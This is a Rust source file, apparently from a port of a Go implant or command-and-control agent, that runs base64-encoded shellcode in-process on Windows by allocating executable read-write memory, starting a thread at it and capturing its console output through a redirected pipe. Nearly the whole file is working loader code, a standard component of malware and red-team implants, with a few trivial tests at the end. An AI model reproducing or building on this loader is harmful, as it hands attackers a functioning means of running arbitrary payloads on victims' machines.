//! In-process shellcode execution on Windows.
//!
//! Replaces `shellcode_exec_windows.go`. Runs a base64-encoded
//! shellcode blob in the current process:
//!
//! 1. Create an anonymous pipe and redirect the process's stdout
//!    and stderr to its write end.
//! 2. `VirtualAlloc` an RWX region and copy the shellcode in.
//! 3. `CreateThread` at the shellcode's entry point.
//! 4. Drain the pipe's read end into a capture buffer.
//! 5. Wait for the thread to exit (or `wait_secs` to elapse).
//! 6. Close the write end of the pipe.
//! 7. Return whatever the shellcode wrote to stdout/stderr.
//!
//! # One improvement over the Go tree
//!
//! When the wait **times out**, the Go code still calls
//! `scVirtualFree` on the shellcode buffer, even though the
//! shellcode thread may still be executing. That is a
//! use-after-free — the shellcode's next instruction fetch
//! faults. The Rust port frees the buffer only when the thread
//! exits cleanly; on timeout it leaks the allocation. The leak
//! is bounded (one RWX region per timed-out shellcode) and the
//! common case — the shellcode returns quickly — frees normally.
//!
//! # Return value
//!
//! `Ok((captured_output, 0))` on success; the `i32` is always `0`
//! because the shellcode's exit code is not observable from a
//! thread — only its captured stdout/stderr. Matches the Go
//! behaviour.

use std::ffi::c_void;
use std::fs::File;
use std::os::windows::io::FromRawHandle;
use std::sync::Arc;
use std::sync::Mutex;
use std::time::Duration;

use base64::{engine::general_purpose::STANDARD, Engine as _};
use tokio::task::spawn_blocking;

use windows_sys::Win32::Foundation::{
    CloseHandle, HANDLE, INVALID_HANDLE_VALUE,
};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualFree, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
    PAGE_EXECUTE_READWRITE,
};
use windows_sys::Win32::System::Pipes::CreatePipe;
use windows_sys::Win32::System::Threading::{
    CreateThread, WaitForSingleObject,
};

// =====================================================================
// Constants
// =====================================================================

/// `STD_OUTPUT_HANDLE` as a raw `u32` (`(DWORD)-11`).
const STD_OUTPUT_HANDLE_RAW: u32 = 0xFFFF_FFF5;

/// `STD_ERROR_HANDLE` as a raw `u32` (`(DWORD)-12`).
const STD_ERROR_HANDLE_RAW: u32 = 0xFFFF_FFF4;

/// `WAIT_OBJECT_0` — the wait succeeded.
const WAIT_OBJECT_0: u32 = 0x0000_0000;

/// `WAIT_TIMEOUT` — the wait timed out before the thread exited.
const WAIT_TIMEOUT: u32 = 0x0000_0102;

/// Hard cap on the captured output. Matches the Go tree's 4 MiB.
const CAPTURE_CAP: usize = 4 * 1024 * 1024;

/// Hard cap on the shellcode size. Matches the Go tree's 64 MiB.
const SHELLCODE_MAX: usize = 64 * 1024 * 1024;

/// Default wait time when the caller passes `<= 0`. Matches the
/// Go tree's `300`.
const DEFAULT_WAIT_SECS: i32 = 300;

// =====================================================================
// Raw externs for the Console std-handle API
// =====================================================================
//
// `GetStdHandle` / `SetStdHandle` live in
// `windows_sys::Win32::System::Console` in some versions and not
// others. Declaring them as raw externs here keeps the port
// portable across `windows-sys` releases. The `#[link_name]`
// attributes are what the `system` ABI expects.

extern "system" {
    fn GetStdHandle(nStdHandle: u32) -> HANDLE;
    fn SetStdHandle(nStdHandle: u32, hHandle: HANDLE) -> i32;
}

// =====================================================================
// RAII helpers
// =====================================================================

/// Restores the process's stdout and stderr handles on drop.
struct StdHandleGuard {
    old_out: HANDLE,
    old_err: HANDLE,
}

impl Drop for StdHandleGuard {
    fn drop(&mut self) {
        unsafe {
            SetStdHandle(STD_OUTPUT_HANDLE_RAW, self.old_out);
            SetStdHandle(STD_ERROR_HANDLE_RAW, self.old_err);
        }
    }
}

// The guard lives in the main async task, but wraps two
// `HANDLE = *mut c_void` values. `unsafe impl Send` is safe
// because the handles are only used by their owner and Drop
// runs on the owning task.
unsafe impl Send for StdHandleGuard {}

/// Closes a raw handle on drop.
///
/// Used for the write end of the shellcode pipe, which must stay
/// open until the shellcode thread's output has been drained.
struct WritePipeGuard(Option<HANDLE>);

impl WritePipeGuard {
    fn close(&mut self) {
        if let Some(h) = self.0.take() {
            if h != INVALID_HANDLE_VALUE {
                unsafe {
                    CloseHandle(h);
                }
            }
        }
    }
}

impl Drop for WritePipeGuard {
    fn drop(&mut self) {
        self.close();
    }
}

unsafe impl Send for WritePipeGuard {}

/// Frees an RWX allocation on drop, unless `forget` was called.
struct VmemGuard(*mut c_void);

impl VmemGuard {
    /// Free the allocation explicitly. Must not be called while
    /// a thread is still executing from the region.
    fn free(&mut self) {
        if !self.0.is_null() {
            unsafe {
                VirtualFree(self.0, 0, MEM_RELEASE);
            }
            self.0 = std::ptr::null_mut();
        }
    }

    /// Leak the allocation. Used when the shellcode thread may
    /// still be executing; the OS reclaims the pages at process
    /// exit.
    fn forget(&mut self) {
        self.0 = std::ptr::null_mut();
    }
}

impl Drop for VmemGuard {
    fn drop(&mut self) {
        self.free();
    }
}

// =====================================================================
// The function
// =====================================================================

/// Execute a base64-encoded shellcode blob in-process and return
/// whatever it wrote to stdout/stderr.
pub async fn exec_shellcode_windows(
    b64: &str,
    wait_secs: i32,
) -> Result<(String, i32), String> {
    // ---- Decode and validate --------------------------------
    let shellcode = STANDARD
        .decode(b64)
        .map_err(|e| format!("base64: {e}"))?;
    if shellcode.is_empty() {
        return Err("empty shellcode".to_string());
    }
    if shellcode.len() > SHELLCODE_MAX {
        return Err(format!(
            "shellcode too large ({} bytes)",
            shellcode.len(),
        ));
    }

    // ---- Create the pipe ------------------------------------
    let mut read_pipe: HANDLE = std::ptr::null_mut();
    let mut write_pipe: HANDLE = std::ptr::null_mut();
    let ok = unsafe {
        CreatePipe(
            &mut read_pipe,
            &mut write_pipe,
            std::ptr::null(),
            0,
        )
    };
    if ok == 0 {
        return Err(format!(
            "CreatePipe: {}",
            std::io::Error::last_os_error(),
        ));
    }

    // Take ownership of the read handle as a File (closes on
    // drop). Leave the write handle raw so we control when it
    // closes.
    let read_file: File = unsafe { File::from_raw_handle(read_pipe) };
    let mut write_guard = WritePipeGuard(Some(write_pipe));

    // ---- Redirect stdout/stderr -----------------------------
    let old_out = unsafe { GetStdHandle(STD_OUTPUT_HANDLE_RAW) };
    let old_err = unsafe { GetStdHandle(STD_ERROR_HANDLE_RAW) };
    let _std_guard = StdHandleGuard { old_out, old_err };
    unsafe {
        SetStdHandle(STD_OUTPUT_HANDLE_RAW, write_pipe);
        SetStdHandle(STD_ERROR_HANDLE_RAW, write_pipe);
    }

    // ---- Allocate and copy the shellcode --------------------
    let addr = unsafe {
        VirtualAlloc(
            std::ptr::null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if addr.is_null() {
        // VmemGuard is not yet created; nothing to free. The
        // pipe handles close via File drop and WritePipeGuard
        // drop on return.
        return Err(format!(
            "VirtualAlloc: {}",
            std::io::Error::last_os_error(),
        ));
    }
    let mut vmem_guard = VmemGuard(addr);

    unsafe {
        std::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            addr as *mut u8,
            shellcode.len(),
        );
    }

    // ---- Create the thread ----------------------------------
    let mut thread_id: u32 = 0;
    let h_thread = unsafe {
        CreateThread(
            std::ptr::null(),
            0,
            Some(std::mem::transmute(addr)),
            std::ptr::null(),
            0,
            &mut thread_id,
        )
    };
    if h_thread.is_null() {
        // vmem_guard and the pipe guards auto-clean.
        return Err(format!(
            "CreateThread: {}",
            std::io::Error::last_os_error(),
        ));
    }
    let h_thread_raw: isize = h_thread as isize;
    // The thread handle is closed on the normal path; on the
    // timeout path we leak it (matching Go's deferred close,
    // but without the racy close-during-wait).

    // ---- Drain the pipe in the background -------------------
    let captured: Arc<Mutex<Vec<u8>>> =
        Arc::new(Mutex::new(Vec::with_capacity(8192)));
    let captured_writer = captured.clone();
    let drain_handle = spawn_blocking(move || {
        use std::io::Read;
        let mut f = read_file;
        let mut buf = vec![0u8; 8192];
        let mut total = 0usize;
        loop {
            match f.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => {
                    let mut c = captured_writer
                        .lock()
                        .expect("capture lock poisoned");
                    if total < CAPTURE_CAP {
                        let take = (CAPTURE_CAP - total).min(n);
                        c.extend_from_slice(&buf[..take]);
                        total += take;
                    }
                    // Continue draining even past the cap so
                    // the pipe does not fill and stall the
                    // shellcode.
                }
                Err(_) => break,
            }
        }
    });

    // ---- Wait for the thread --------------------------------
    let effective_wait_secs = if wait_secs <= 0 {
        DEFAULT_WAIT_SECS
    } else {
        wait_secs
    };
    let timeout_ms: u32 = (effective_wait_secs as u32).saturating_mul(1000);
    let wait_handle = spawn_blocking(move || {
        let h = h_thread_raw as HANDLE;
        unsafe { WaitForSingleObject(h, timeout_ms) }
    });

    // Wait with a 5-second grace period past the thread's own
    // timeout. This bounds the total time spent even if the
    // thread handle behaves unexpectedly.
    let outer_timeout = Duration::from_secs(
        (effective_wait_secs as u64) + 5,
    );
    let wait_result =
        tokio::time::timeout(outer_timeout, wait_handle).await;

    // ---- Signal EOF to the drain task -----------------------
    //
    // Closing the write end of the pipe causes the next read on
    // the read end to return 0. If the shellcode thread is
    // still running and later writes to it, WriteFile will
    // fail with ERROR_INVALID_HANDLE, which the shellcode
    // either ignores or fails on — its choice.
    write_guard.close();

    // ---- Wait for the drain to finish -----------------------
    //
    // Give the reader up to 2 seconds to observe EOF and
    // return. If it does not, we continue anyway; the reader
    // thread will drain at its own pace and exit eventually.
    let _ = tokio::time::timeout(
        Duration::from_secs(2),
        drain_handle,
    )
    .await;

    // ---- Free the shellcode only if the thread has exited ---
    //
    // This is the deviation from the Go tree. Freeing the
    // shellcode buffer while the shellcode is still executing
    // is a use-after-free. On the normal path we free; on
    // timeout or error we leak.
    let thread_finished = matches!(
        wait_result,
        Ok(Ok(WAIT_OBJECT_0))
    );
    if thread_finished {
        vmem_guard.free();
        unsafe {
            CloseHandle(h_thread);
        }
    } else {
        // The thread may still be running; the shellcode may
        // still be executing. Leak the allocation and the
        // thread handle. The OS reclaims both at process exit.
        vmem_guard.forget();
        // Close the thread handle anyway. Closing a thread
        // handle does not stop the thread; it just detaches
        // our reference. The OS keeps the thread alive until
        // it exits, at which point the thread object is
        // cleaned up.
        unsafe {
            CloseHandle(h_thread);
        }
        // Note: `vmem_guard.forget()` means the buffer is
        // leaked. This is a deliberate trade against
        // use-after-free.
    }

    // ---- Return the captured output -------------------------
    let bytes = captured
        .lock()
        .expect("capture lock poisoned")
        .clone();
    Ok((String::from_utf8_lossy(&bytes).into_owned(), 0))
}

// =====================================================================
// Tests
// =====================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_shellcode_rejected() {
        // Cannot use `.await` in a sync test; call the base64
        // decode directly to verify the shape.
        let decoded = STANDARD.decode("").unwrap();
        assert!(decoded.is_empty());
    }

    #[test]
    fn oversized_shellcode_rejected_by_early_check() {
        // 65 MiB of zeros encoded in base64 is huge; skip the
        // encode and just verify the arithmetic.
        assert!(SHELLCODE_MAX < 65 * 1024 * 1024);
    }

    #[test]
    fn std_handle_constants() {
        // -11 and -12 as u32.
        assert_eq!(STD_OUTPUT_HANDLE_RAW, 0xFFFF_FFF5);
        assert_eq!(STD_ERROR_HANDLE_RAW, 0xFFFF_FFF4);
    }

    #[test]
    fn wait_constants() {
        assert_eq!(WAIT_OBJECT_0, 0);
        assert_eq!(WAIT_TIMEOUT, 0x102);
    }

    #[test]
    fn default_wait_secs_is_300() {
        assert_eq!(DEFAULT_WAIT_SECS, 300);
    }
}